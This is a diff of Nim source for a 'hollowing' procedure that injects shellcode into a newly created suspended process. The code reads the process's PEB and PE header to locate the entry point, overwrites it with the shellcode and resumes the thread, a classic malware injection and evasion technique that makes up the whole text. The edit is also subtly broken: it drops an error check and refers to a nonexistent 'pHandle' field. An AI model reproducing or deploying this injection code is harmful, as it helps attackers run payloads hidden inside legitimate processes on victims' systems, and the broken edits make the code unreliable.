@@ -33,31 +33,18 @@ proc hollowing[byte](shellcode: openArray[byte]): void =
   var si: STARTUPINFOEX
   var pi: PROCESS_INFORMATION
 
-  res = CreateProcess(
-        NULL,
-        newWideCString(processImage),
-        ps,
-        ts, 
-        FALSE,
-        0x4,
-        NULL,
-        NULL,
-        addr si.StartupInfo,
-        addr pi)
+  res = CreateProcess(NULL, newWideCString(processImage), ps, ts, FALSE, CREATE_SUSPENDED, NULL, NULL, addr si.StartupInfo, addr pi)
   
-  if res == 0:
-    return
-
-  var hProcess = pi.hProcess
+  var pHandle = pi.pHandle
   var bi: PROCESS_BASIC_INFORMATION
 
-  res = ZwQueryInformationProcess(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, addr bi, cast[ULONG](sizeof(bi)), addr tmp)
+  ZwQueryInformationProcess(pHandle, PROCESSINFOCLASS.ProcessBasicInformation, addr bi, cast[ULONG](sizeof(bi)), addr tmp)
 
   let ptrToImageBase = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10);
-  ReadProcessMemory(hProcess, ptrToImageBase, addr baseAddressBytes, sizeof(PVOID), addr nBytes);
+  ReadProcessMemory(pHandle, ptrToImageBase, addr baseAddressBytes, sizeof(PVOID), addr nBytes);
 
-  var imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))
-  ReadProcessMemory(hProcess, imageBaseAddress, addr data, len(data), addr nBytes);
+  let imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))
+  ReadProcessMemory(pHandle, imageBaseAddress, addr data, len(data), addr nBytes);
 
   var e_lfanew: uint
   littleEndian32(addr e_lfanew, addr data[0x3c])
@@ -67,7 +54,7 @@ proc hollowing[byte](shellcode: openArray[byte]): void =
   littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
 
   var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
-  WriteProcessMemory(hProcess, entrypointAddress, unsafeAddr shellcode, len(shellcode), addr nBytes);
+  WriteProcessMemory(pHandle, entrypointAddress, unsafeAddr shellcode, len(shellcode), addr nBytes);
   ResumeThread(pi.hThread);
 
 when isMainModule:
